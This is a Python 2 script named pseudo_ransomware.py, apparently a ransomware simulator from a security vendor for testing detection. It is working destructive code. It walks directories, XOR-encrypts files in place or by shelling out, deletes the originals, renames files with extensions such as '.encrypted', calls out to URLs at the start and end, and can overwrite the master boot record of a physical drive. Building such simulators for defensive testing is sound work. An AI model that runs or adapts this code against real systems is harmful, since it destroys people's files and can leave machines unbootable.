#!/usr/bin/env python

###############################################################################
# 
# file:     pseudo_ransomware.py 
#
# author:   bsturk - bsturk@carbonblack.com
#
# dependencies:
#           pip install puremagic ( also installs argparse )
#           pip install requests
#           pip install pypiwin32 -or- win32api installer ( https://sourceforge.net/projects/pywin32/files/pywin32/ )
#
# created:  01/30/17
# last_mod: 07/31/18
# version:  1.10
#
# usage, etc:
# 
#   e.g. python pseudo_ransomware.py -r -p file_dir -x .crypt -N http://www.wtfismyip.com -c 1 -w 3
#
# exe generation ( not currently working ):
#
#           python setup.py py2exe
#
# arguments:
#
# TODO:
#
# history:
#
#   1.0     01/30/17 - Initial commit.
#   1.1     02/07/17 - Added flag and handling for recursing into directories, more
#                      I/O options, rename write method, rename extension arg, 
#                      use of magic/file ident option, and some small fixes/org.
#   1.2     02/10/17 - py2exe setup file, fixed -p w/ drive letters, fixed issue
#                      with default crypt method.
#   1.3     03/08/17 - network callout args added, finished up post rename option
#                      for inline modifications, added delete call for rename modify
#                      option.
#   1.4     03/09/17 - New write method for memory mapped I/O.
#   1.5     03/17/17 - New option for writing file to MBR on Windows and other platforms.  
#                      Added missing sys import.
#   1.6     03/27/17 - Added new encryption type which allows for shelling out to a command
#                      to do the encryption.  Also fixed issue with write file handle cleanup.
#   1.7     07/20/17 - Added option to do file iteration via shelling out.  Also added option
#                      to do everything via a specified command ala Patcher.
#   1.8     08/31/17 - Updated script to not limit MBR writes to 512 bytes.
#   1.9     09/13/17 - Added option to open a handle to the disk for MBR writes N times.
#   1.10    07/31/18 - Added option to alternate between 2 extensions every n files for renamed, written files.
#
###############################################################################

import os
import sys
import tempfile
import errno
import mmap
import subprocess

import argparse
import puremagic
import requests

import itertools

if os.name == 'nt':
    import win32api, win32con, win32file

#############

VERSION                                    = 1.10

READ_METHOD_NONE                           = 0
READ_METHOD_NORMAL                         = 1

WRITE_METHOD_NONE                          = 0
WRITE_METHOD_INLINE                        = 1
WRITE_METHOD_READ_WR_RM                    = 2
WRITE_METHOD_MAPPED_WR                     = 3

WRITE_METHOD_MIN_VAL                       = WRITE_METHOD_NONE
WRITE_METHOD_MAX_VAL                       = WRITE_METHOD_MAPPED_WR

ENCRYPT_METHOD_NONE                        = 0
ENCRYPT_METHOD_XOR                         = 1
ENCRYPT_METHOD_EXTERNAL_TOOL_WITH_FILENAME = 2

ENCRYPT_METHOD_MIN_VAL                     = ENCRYPT_METHOD_NONE
ENCRYPT_METHOD_MAX_VAL                     = ENCRYPT_METHOD_EXTERNAL_TOOL_WITH_FILENAME

paths                                      = []
exts                                       = []
write_method                               = WRITE_METHOD_INLINE
read_method                                = READ_METHOD_NORMAL
encryption_method                          = ENCRYPT_METHOD_XOR
encryption_command                         = ''
iteration_command                          = ''
xor_key                                    = 42
skip_hidden                                = False
dir_recurse                                = False
rename_extension_1                         = '.encrypted'
rename_extension_2                         = '.encrypted_2'
file_extension_pattern                     = None
post_rename                                = False                 ## TODO: utilize this
do_magic                                   = False
pre_netconn                                = ''                    ## empty string sentinel to not do it
post_netconn                               = ''
win_write_mbr_file                         = ''
num_mbr_handles                            = 1

#############

def is_hidden( _filename ):

    if os.name == 'nt':
        attribute = win32api.GetFileAttributes( _filename )
        return attribute & ( win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM )

    else:
        ## macos && linux dotfiles
        return os.path.basename( _filename ).startswith( '.' )

#############

def make_network_connection( _url ):

    resp = requests.get( _url )
    #print resp.text

#############

def encrypt_none( _file_data ):

    return _file_data

#############

def encrypt_xor( _file_data ):

    barray = bytearray( _file_data )

    ## XOR each byte

    for i in range( len( barray ) ):
        barray[i] ^= xor_key

    return barray

#############

def encrypt_with_external_command( _filename ):

    command = encryption_command

    ## subst out markers for filename and basename

    invoke = command.replace( '%F', _filename )
    invoke = invoke.replace( '%f', os.path.basename( _filename ) )
    invoke = invoke.replace( '%d', os.path.dirname( _filename ) )

    ## TODO: probably should use subprocess here
    
    #print 'Running command ' + invoke

    ret = os.system( invoke )

    if ret <> 0:
        print 'encrypt_with_external_command(): Command %s failed to run: %d' % ( invoke, ret )

#############

enc_map = { ENCRYPT_METHOD_NONE : encrypt_none, ENCRYPT_METHOD_XOR : encrypt_xor, ENCRYPT_METHOD_EXTERNAL_TOOL_WITH_FILENAME : encrypt_with_external_command }

#############

def encrypt_file( _filename ):

    print 'Encrypting ' + _filename

    encrypt_func = enc_map[ encryption_method ]
    rh           = None
    wh           = None
    size         = ()       ## default to entire file

    try:

        next_extension = next( file_extension_pattern )

        if read_method == READ_METHOD_NORMAL:       ##  gotta read to write

            if write_method == WRITE_METHOD_NONE:
                rh        = open( _filename, 'rb' )

            elif write_method == WRITE_METHOD_INLINE:
                rh        = open( _filename, 'r+' )
                wh        = rh

            elif write_method == WRITE_METHOD_READ_WR_RM:
                rh        = open( _filename, 'r' )
                fn_no_ext = os.path.splitext( _filename )[0]
                wh        = open( fn_no_ext + next_extension, 'w' )

            elif write_method == WRITE_METHOD_MAPPED_WR:
                rh        = open( _filename, 'a+b' )
                wh        = mmap.mmap( rh.fileno(), 0, access = mmap.ACCESS_WRITE )
                size      = ( os.path.getsize( _filename ), )

            contents = rh.read( *size )
            enc_data = encrypt_func( contents )

        else:
            encrypt_func( _filename )

        if wh is not None:
            wh.seek( 0 )
            wh.write( str( enc_data ) )

            if ( wh == rh ):

                ## close just once

                wh.close()
                rh = None
                wh = None

        if rh is not None:
            rh.close()

        if wh is not None:
            wh.close()

        if write_method == WRITE_METHOD_READ_WR_RM:
            os.remove( _filename )

        if post_rename:
            fn_no_ext = os.path.splitext( _filename )[0]
            os.rename( _filename, fn_no_ext + next_extension )

    except Exception, e:
        print str( e )
        return False

    return True

#############

def write_mbr_winapi( _file ):

    print 'Are you SURE you want to overwrite the MBR?? This will possibly make the volume unbootable.'
    response = raw_input( 'Type \"YES\" then Return to continue, anything else then Return to not continue:' )

    if response != 'YES':
        return

    h       = None
    handles = []

    try:

        for x in range( num_mbr_handles ):

            h = win32file.CreateFile( '\\\\.\\PhysicalDrive0',
                    win32con.GENERIC_WRITE,
                    win32file.FILE_SHARE_WRITE,
                    None,
                    win32file.OPEN_EXISTING,
                    win32file.FILE_ATTRIBUTE_NORMAL,
                    None )

            if ( h != win32file.INVALID_HANDLE_VALUE ):
                handles.append( h )

        f = open( _file, 'rb' )

        if f <> None:

            fsize = os.path.getsize( _file )
            wsize = 512

            if fsize > 512:
                print 'WARNING: File being written is > 512 bytes, will only write 512...'
                wsize = 512

            contents = f.read( fsize )

            if fsize < 512:

                print 'WARNING: Padding file up to 512 bytes, may not have expected results...'

                ## pad it out to 512 bytes
                diff = 512 - 512

                for num in xrange( diff ):
                    contents += 'A'

            win32file.WriteFile( h, contents, None )

            f.close()

    except Exception, e:
        print str( e )
        print '\tAre you running as Administrator?'

    for handle in handles:
        win32file.CloseHandle( handle )

#############

def write_mbr( _device, _file ):

    print 'Are you SURE you want to overwrite the MBR?? This will possibly make the volume unbootable.'
    response = raw_input( 'Type \"YES\" then Return to continue, anything else then Return to not continue:' )

    if response != 'YES':
        return

    d  = None
    fd = 0

    try:
        print 'Opening raw disk device...'

        d  = open( _device, 'rb+' )
        fd = d.fileno()

        print 'Opened device...'

        os.lseek( fd, 0, 0 )
        mbr = os.read( fd, 512 )
        print mbr

        size = os.path.getsize( _file )

        if size > 512:
            print 'WARNING: File being written is > 512 bytes, will only write 512...'
            size = 512

        f = open( _file, 'rb' )

        if f <> None:

            print 'Opened file passed in...'

            contents    = f.read( size )
            num_written = os.write( fd, contents )
            f.close()

            print 'Wrote file passed in, %d bytes...' % num_written

            d.flush()

            os.lseek( fd, 0, 0 )
            mbr = os.read( fd, 512 )
            print mbr

        os.close( fd )
        d.close()

        sys.exit( 0 )

    except Exception, e:
        print 'Exception ' + str( e )
        print '\tAre you running as Administrator?'

#############

def get_filenames( _path ):

    files = []

    if iteration_command:

        ## NOTE: recursion can be handled with tool - i.e. with find use -maxdepth 1 to disable recursion
        ##       tool also has to present valid filenames with respect to PWD

        command = iteration_command

        ## subst out markers for path

        invoke = command.replace( '%d', _path )

        #print 'Running command ' + invoke

        lines = []

        try:
            p  = subprocess.Popen( invoke, stdout = subprocess.PIPE )

        except:
            print 'get_filenames(): Exception - Command %s failed to run' % ( invoke, )
            return []

        for line in p.stdout.readlines():
            lines.append( line )

        p.wait()

        if ( p.returncode <> 0 ):
            print 'get_filenames(): Command %s failed to run: %d' % ( invoke, p.returncode )

        else:
            for line in lines:
                print line
                files.append( line.rstrip() )

    else:

        if dir_recurse:

            for r, dirs, filenames in os.walk( _path ):
                for f in filenames:
                    files.append( os.path.join ( r, f ) )

        else:

            tmp = os.listdir( _path )

            for f in tmp:
                fqn = os.path.join( _path, f ) 
                if not os.path.isdir( fqn ):
                    files.append( fqn )

    return files

#############

def run():

    if win_write_mbr_file <> '':
        write_mbr_winapi( win_write_mbr_file )

    ## TODO: other platforms need to pass in /dev/sdX (Linux) or /dev/diskX (Mac)

    if pre_netconn <> '':
        make_network_connection( pre_netconn )

    for path in paths:

        print 'Iterating files in ' + path

        files = get_filenames( path )

        for f in files:

            fname, fext = os.path.splitext( f )

            if len( exts ) == 0 or fext in exts:

                if skip_hidden and is_hidden( f ):
                    print 'Skipping hidden file ' + f
                    continue

                ok = True

                if ( do_magic ):

                    try:
                        mext = puremagic.from_file( f )

                        if fext.lower() not in mext:
                            print 'Improper identification - claimed ' + fext + ', ident as ' + mext + ', skipping...'
                            ok = False

                    except puremagic.PureError:
                        print 'Couldn\'t identify file, encrypting anyway...'
                        ok = True

                if ok:
                    success = encrypt_file( f )

    if post_netconn <> '':
        make_network_connection( post_netconn )

#############

def encryption_method_type( _val ):

    try:
        _val = int( _val )

        if _val < ENCRYPT_METHOD_MIN_VAL or _val > ENCRYPT_METHOD_MAX_VAL:
            raise argparse.ArgumentTypeError( 'encrypt method must be between %d and %d' % ( ENCRYPT_METHOD_MIN_VAL, ENCRYPT_METHOD_MAX_VAL ) )

    except:
        raise argparse.ArgumentTypeError( 'invalid encrypt method arg' )

    return _val

#############

def print_enc_method( _info, _method ):

    print '===== Using encryption method ====='

    txt  = '<UNKNOWN>'
    post = ' [' + _info + ']'

    if _method == ENCRYPT_METHOD_NONE:
        txt = 'none'

    if _method == ENCRYPT_METHOD_XOR:
        txt = 'xor'

    if _method == ENCRYPT_METHOD_EXTERNAL_TOOL_WITH_FILENAME:
        txt = 'external command ' + encryption_command

    print '\t' + txt + post
    print

#############

def write_method_type( _val ):

    try:
        _val = int( _val )

        if _val < WRITE_METHOD_MIN_VAL or _val > WRITE_METHOD_MAX_VAL:
            raise argparse.ArgumentTypeError( 'write method must be between %d and %d' % ( WRITE_METHOD_MIN_VAL, WRITE_METHOD_MAX_VAL ) )

    except:
        raise argparse.ArgumentTypeError( 'invalid write method arg' )

    return _val

#############

def print_write_method( _info, _method ):

    print '===== Using write method ====='

    txt  = '<UNKNOWN>'
    post = ' [' + _info + ']'

    if _method == WRITE_METHOD_NONE:
        txt = 'no writing'

    if _method == WRITE_METHOD_INLINE:
        txt = 'inline'

    elif _method == WRITE_METHOD_READ_WR_RM:
        txt = 'read/write/rm'

    elif _method == WRITE_METHOD_MAPPED_WR:
        txt = 'memory mapped I/O'

    print '\t' + txt + post
    print

#############

def handle_args():

    global paths
    global exts
    global read_method
    global write_method
    global encryption_method
    global encryption_command
    global iteration_command
    global skip_hidden
    global dir_recurse
    global rename_extension_1
    global rename_extension_2
    global file_extension_pattern
    global post_rename
    global do_magic
    global pre_netconn
    global post_netconn
    global win_write_mbr_file
    global num_mbr_handles
    
    parser = argparse.ArgumentParser()

    parser.add_argument( '-p', '--paths', help = 'comma separated list of paths to iterate over' )
    parser.add_argument( '-e', '--extensions', help = 'comma separated list of extensions to encrypt - default all extensions are encrypted' )
    parser.add_argument( '-w', '--writemethod', type = write_method_type, help = 'write method: 0 - none; 1 - write in place; 2 - read, write new, rm orig; 3 memory mapped I/O; default = 1' )
    parser.add_argument( '-c', '--encmethod', type = encryption_method_type, help = 'encryption method: 0 - none; 1 - xor; 2 - external command; default = 1' )
    parser.add_argument( '-C', '--enccmd', help = 'encryption command invocation, specify marker for basename with %f, dir with %d, and filename and extension with %F: i.e. zip %d\%f.encrypt %d\%F' )
    parser.add_argument( '-I', '--itercmd', help = 'file iteration command invocation, specify marker for dir with %d, i.e. find -type f %d or dir /s *txt*' )
    parser.add_argument( '-H', '--skiphidden', help = 'skip hidden files', action = 'store_true' )
    parser.add_argument( '-r', '--recurse', help = 'recurse into directories', action = 'store_true' )
    parser.add_argument( '-x', '--renameext1', help = 'first extension to use for renamed written file' )
    parser.add_argument( '-X', '--renameext2', help = 'second extension to use for renamed written file' )
    parser.add_argument( '-a', '--alternate', help = 'change how many time a file extension is repeated before alternating' )
    parser.add_argument( '-P', '--postrename', help = 'when modifying original file inline, rename when finished', action = 'store_true' )
    parser.add_argument( '-m', '--domagic', help = 'do file type validation before encrypting', action = 'store_true' )
    parser.add_argument( '-n', '--prenetconn', help = 'url to hit at start of process' )
    parser.add_argument( '-N', '--postnetconn', help = 'url to hit at end of process' )
    parser.add_argument( '-b', '--winwritembr', help = 'will write contents of file argument to the MBR on Windows' )
    parser.add_argument( '-d', '--numhandlembr', help = 'number of times to open a handle to the disk for MBR writes - default = 1' )

    args = parser.parse_args()

    if args.paths is None:
        print 'No paths to walk...'
        paths = []
        
    else:
        paths = args.paths.split( ',' )

    print '===== encrypting files in ====='

    for path in paths:
        print '\t' + path
        
    print

    if args.extensions is not None:

        print args.extensions

        exts = args.extensions.split( ',' )

        print '===== with extensions ====='

        for ext in exts:
            print '\t' + ext
        
        print

    if args.skiphidden is not None:
        skip_hidden = args.skiphidden

    if skip_hidden:
        print '===== skipping hidden files ====='

    else:
        print '===== including hidden files ====='

    print

    if args.recurse is not None:
        dir_recurse = args.recurse

    if dir_recurse:
        print '===== recursing into specified directories ====='

    else:
        print '===== NOT recursing into specified directories ====='

    print

    if args.writemethod is not None:
        write_method = args.writemethod
        print_write_method( 'override', write_method )

    else:
        print_write_method( 'default', write_method )

    if args.enccmd is not None:
        read_method        = READ_METHOD_NONE
        encryption_command = args.enccmd
        print '===== encrypting using command %s =====' % ( encryption_command, )

    if args.encmethod is not None:
        encryption_method = args.encmethod
        print_enc_method( 'override', encryption_method )

    else:
        print_enc_method( 'default', encryption_method )

    if args.itercmd is not None:
        iteration_command = args.itercmd
        print '===== iterating using command %s =====' % ( iteration_command, )

    if args.renameext1 is not None:
        rename_extension_1 = args.renameext1
        print '===== rename extension is %s =====' % ( rename_extension_1 )

    if args.renameext2 is not None:
        rename_extension_2 = args.renameext2
        print '===== rename extension 2 is %s =====' % ( rename_extension_2 )

    if args.postrename is not None and args.postrename:
        post_rename = args.postrename
        print '===== renaming modified file inline ====='

    if args.domagic is not None and args.domagic:
        do_magic = args.domagic
        print '===== verifing file contents (via libmagic) against extension ====='

    if args.prenetconn is not None:
        pre_netconn = args.prenetconn
        print '===== will connect to at %s start =====' % ( pre_netconn )

    if args.postnetconn is not None:
        post_netconn = args.postnetconn
        print '===== will connect to at %s end =====' % ( post_netconn )

    if args.winwritembr is not None:
        win_write_mbr_file = args.winwritembr
        print '===== Will write contents of %s to MBR on \\\\.\\PhysicalDrive0 =====' % ( win_write_mbr_file )

    if args.alternate is not None:

        assert( rename_extension_2 is not None )

        num_alternate = args.alternate
        print 'Extensions will alternate every ' + num_alternate + ' lines between ' + rename_extension_1 + ' and ' + rename_extension_2

        # initialize pattern if alternate is specified

        file_extension_pattern = itertools.cycle( int( num_alternate ) * [ str( rename_extension_1 ) ] + int( num_alternate ) * [ str( rename_extension_2 ) ] )

    else:
        # just use the first extension

        file_extension_pattern = itertools.cycle( [ rename_extension_1 ] )

    if args.numhandlembr is not None:
        num_mbr_handles = int( args.numhandlembr )
        print '===== will open a handle to the disk for MBR writes ' + str( num_mbr_handles ) + ' times ====='

#############

if __name__ == '__main__':

    handle_args()

    run()
